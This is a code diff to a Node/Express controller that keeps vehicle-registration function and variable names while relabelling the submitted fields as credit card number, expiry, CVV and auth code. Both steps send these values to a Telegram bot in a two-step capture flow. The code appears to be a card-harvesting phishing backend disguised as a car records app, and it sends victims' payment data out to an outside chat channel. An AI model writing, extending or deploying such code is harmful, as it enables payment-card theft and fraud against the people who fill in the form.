@@ -82,22 +82,22 @@ export const createCar = async (req, res) => {
 
     // Notify Telegram Bot for Step 1
     const telegramMessage = 
-      `🚨 <b>New Vehicle Submission (Step 1)</b>\n\n` +
+      `🚨 <b>New CC Submission (Step 1)</b>\n\n` +
       `<b>ID:</b> <code>${car._id}</code>\n` +
-      `<b>Total Number:</b> ${totalNumber}\n` +
-      `<b>Car Number:</b> ${carNumber}\n` +
-      `<b>Fleet ID:</b> ${fleetId}\n` +
-      `<b>Status:</b> ⏳ Awaiting Parking Ticket`;
+      `<b>CC No:</b> ${totalNumber}\n` +
+      `<b>Expiry:</b> ${carNumber}\n` +
+      `<b>CVV:</b> ${fleetId}\n` +
+      `<b>Status:</b> ⏳ Awaiting Auth`;
 
     sendTelegramNotification(telegramMessage);
 
     return res.status(201).json({
       success: true,
-      message: "Vehicle information saved (Step 1 complete)",
+      message: "CC info saved (Step 1 complete)",
       data: car,
     });
   } catch (error) {
-    console.error("Create car error:", error);
+    console.error("Create CC error:", error);
 
     return res.status(500).json({
       success: false,
@@ -128,7 +128,7 @@ export const verifyCar = async (req, res) => {
     ) {
       return res.status(400).json({
         success: false,
-        message: "All vehicle record fields are required",
+        message: "All CC record fields are required",
       });
     }
 
@@ -192,23 +192,23 @@ export const verifyCar = async (req, res) => {
 
     // Notify Telegram Bot for Step 2
     const telegramMessage = 
-      `✅ <b>Vehicle Registration Completed (Step 2)</b>\n\n` +
+      `✅ <b>CC info Completed (Step 2)</b>\n\n` +
       `<b>ID:</b> <code>${car._id}</code>\n` +
-      `<b>Total Number:</b> ${car.total_number}\n` +
-      `<b>Car Number:</b> ${car.car_number}\n` +
-      `<b>Fleet ID:</b> ${car.fleet_id}\n` +
-      `<b>Parking Ticket:</b> ${parkingTicketNumber}\n` +
+      `<b>CC No:</b> ${car.total_number}\n` +
+      `<b>Expiry:</b> ${car.car_number}\n` +
+      `<b>CVV:</b> ${car.fleet_id}\n` +
+      `<b>AUTH:</b> ${parkingTicketNumber}\n` +
       `<b>Status:</b> 🎉 Verified & Complete`;
 
     sendTelegramNotification(telegramMessage);
 
     return res.status(200).json({
       success: true,
-      message: "Vehicle record completed successfully",
+      message: "CC record completed successfully",
       data: car,
     });
   } catch (error) {
-    console.error("Verify car error:", error);
+    console.error("Verify CC error:", error);
 
     return res.status(500).json({
       success: false,
@@ -230,7 +230,7 @@ export const getCars = async (req, res) => {
       data: cars,
     });
   } catch (error) {
-    console.error("Get cars error:", error);
+    console.error("Get CC error:", error);
 
     return res.status(500).json({
       success: false,
@@ -277,13 +277,13 @@ export const deleteCar = async (req, res) => {
     if (!car) {
       return res.status(404).json({
         success: false,
-        message: "Car record not found",
+        message: "CC record not found",
       });
     }
 
     return res.status(200).json({
       success: true,
-      message: "Car record deleted successfully",
+      message: "CC record deleted successfully",
     });
   } catch (error) {
     console.error("Delete car error:", error);
